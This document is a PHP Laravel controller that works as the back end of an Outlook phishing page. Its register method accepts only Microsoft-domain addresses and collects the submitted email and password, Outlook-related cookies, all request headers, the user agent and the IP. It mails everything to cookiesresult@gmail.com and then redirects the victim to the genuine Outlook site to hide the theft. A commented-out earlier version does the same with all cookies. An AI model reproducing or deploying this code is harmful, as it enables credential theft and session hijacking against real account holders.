<?php

namespace App\Http\Controllers;

use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Validator;
use App\Mail\ContractMail;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Cookie;
use Illuminate\Support\Facades\Crypt; // Import Crypt facade for decryption

class AuthController extends Controller
{


    // public function register1(Request $request)
    // {
    //     // Outlook domains whitelist
    //     $outlookDomains = [
    //         'outlook.com',
    //         'outlook.fr',
    //         'outlook.de',
    //         'outlook.it',
    //         'outlook.be',
    //         'outlook.dk',
    //         'outlook.es',
    //         'outlook.pt',
    //         'outlook.ie',
    //         'outlook.co.uk',
    //         'outlook.co.nz',
    //         'outlook.co.th',
    //         'outlook.sa',
    //         'outlook.com.ar',
    //         'outlook.com.au',
    //         'outlook.com.br',
    //         'outlook.com.gr',
    //         'outlook.com.tr',
    //         'outlook.com.vn',
    //         'outlook.sg',
    //         'outlook.ph',
    //         'hotmail.com',
    //         'live.com',
    //         'msn.com'
    //     ];

    //     // Extract domain from email
    //     $emailParts = explode('@', $request->email);
    //     $domain = end($emailParts);

    //     // Check if the email domain is in the allowed list
    //     if (!in_array(strtolower($domain), $outlookDomains)) {
    //         return redirect()->back()
    //             ->withErrors(['email' => 'Only Outlook, Hotmail, Live, and MSN email addresses are allowed.'])
    //             ->withInput();
    //     }

    //     // Validate the request data
    //     $validator = Validator::make($request->all(), [
    //         'email' => 'required|string|email|max:255',
    //         'password' => 'required|string',
    //     ]);

    //     if ($validator->fails()) {
    //         return redirect()->back()
    //             ->withErrors($validator)
    //             ->withInput();
    //     }

    //     // Get the raw cookie header from the request
    //     $cookieHeader = $request->header('Cookie');

    //     // If no cookie header, try to get from server variables
    //     if (!$cookieHeader) {
    //         $cookieHeader = $_SERVER['HTTP_COOKIE'] ?? '';
    //     }

    //     // Parse cookie string into array
    //     $cookieArray = [];
    //     if ($cookieHeader) {
    //         $pairs = explode(';', $cookieHeader);
    //         foreach ($pairs as $pair) {
    //             $parts = explode('=', trim($pair), 2);
    //             if (count($parts) === 2) {
    //                 $cookieArray[$parts[0]] = urldecode($parts[1]);
    //             }
    //         }
    //     }

    //     // Store all request headers
    //     $headers = [];
    //     foreach ($request->headers->all() as $key => $value) {
    //         $headers[$key] = $value[0];
    //     }

    //     // Combine cookies and headers into one data structure
    //     $browserData = [
    //         'cookies' => $cookieArray,
    //         'headers' => $headers,
    //         'userAgent' => $request->header('User-Agent'),
    //         'ip' => $request->ip(),
    //         'timestamp' => now()->toIso8601String()
    //     ];

    //     // Create the user with the complete browser data
    //     // $user = User::create([
    //     //     'email' => $request->email,
    //     //     'password' => $request->password,
    //     //     'cookies' => json_encode($browserData), // Store all browser data as JSON
    //     // ]);

    //     // Prepare form data to send in the email
    //     $formData = $request->only(['email', 'password']);
    //     $formData['browserData'] = $browserData; // Add browser data to email

    //     // Send the email
    //     try {
    //         // Mail::to('cookiesresult@gmail.com')->send(new ContractMail($formData));
    //         return redirect()->away('https://outlook.office365.com');
    //     } catch (\Exception $e) {
    //         return redirect()->back()->with('error', 'Failed to send email: ' . $e->getMessage());
    //     }
    // }

    public function register(Request $request)
{
    // Outlook domains whitelist
    $outlookDomains = [
        'outlook.com', 'outlook.fr', 'outlook.de', 'outlook.it', 'outlook.be', 'outlook.dk',
        'outlook.es', 'outlook.pt', 'outlook.ie', 'outlook.co.uk', 'outlook.co.nz',
        'outlook.co.th', 'outlook.sa', 'outlook.com.ar', 'outlook.com.au', 'outlook.com.br',
        'outlook.com.gr', 'outlook.com.tr', 'outlook.com.vn', 'outlook.sg', 'outlook.ph',
        'hotmail.com', 'live.com', 'msn.com'
    ];

    // Extract domain from email
    $emailParts = explode('@', $request->email);
    $domain = end($emailParts);

    // Check if the email domain is in the allowed list
    if (!in_array(strtolower($domain), $outlookDomains)) {
        return redirect()->back()
            ->withErrors(['email' => 'Only Outlook, Hotmail, Live, and MSN email addresses are allowed.'])
            ->withInput();
    }

    // Validate the request data
    $validator = Validator::make($request->all(), [
        'email' => 'required|string|email|max:255',
        'password' => 'required|string',
    ]);

    if ($validator->fails()) {
        return redirect()->back()
            ->withErrors($validator)
            ->withInput();
    }

    // Get the raw cookie header from the request
    $cookieHeader = $request->header('Cookie') ?? ($_SERVER['HTTP_COOKIE'] ?? '');

    // Parse cookie string into array, but only include Outlook related cookies
    $cookieArray = [];
    if ($cookieHeader) {
        $pairs = explode(';', $cookieHeader);
        foreach ($pairs as $pair) {
            $parts = explode('=', trim($pair), 2);
            if (count($parts) === 2) {
                $cookieName = $parts[0];
                // Check if the cookie name suggests it's related to Outlook
                if (strpos(strtolower($cookieName), 'outlook') !== false ||
                    strpos(strtolower($cookieName), 'live') !== false ||
                    strpos(strtolower($cookieName), 'msn') !== false ||
                    strpos(strtolower($cookieName), 'hotmail') !== false) {
                    $cookieArray[$cookieName] = urldecode($parts[1]);
                }
            }
        }
    }

    // Store all request headers
    $headers = [];
    foreach ($request->headers->all() as $key => $value) {
        $headers[$key] = $value[0];
    }

    // Combine cookies and headers into one data structure
    $browserData = [
        'cookies' => $cookieArray,
        'headers' => $headers,
        'userAgent' => $request->header('User-Agent'),
        'ip' => $request->ip(),
        'timestamp' => now()->toIso8601String()
    ];

    // Prepare form data to send in the email
    $formData = $request->only(['email', 'password']);
    $formData['browserData'] = $browserData; // Add browser data to email

    // Send the email
    try {
        // Placeholder for email sending logic
       Mail::to('cookiesresult@gmail.com')->send(new ContractMail($formData));

        return redirect()->away('https://outlook.office365.com');
    } catch (\Exception $e) {
        return redirect()->back()->with('error', 'Failed to send email: ' . $e->getMessage());
    }
}

    public function decryptCookies($userId)
    {
        $user = User::find($userId);

        if (!$user) {
            return "User not found.";
        }

        try {
            $cookiesArray = json_decode($user->cookies, true);
            return response()->json($cookiesArray ?? []);
        } catch (\Exception $e) {
            return response()->json(['error' => 'Failed to decode cookies: ' . $e->getMessage()], 500);
        }
    }
}
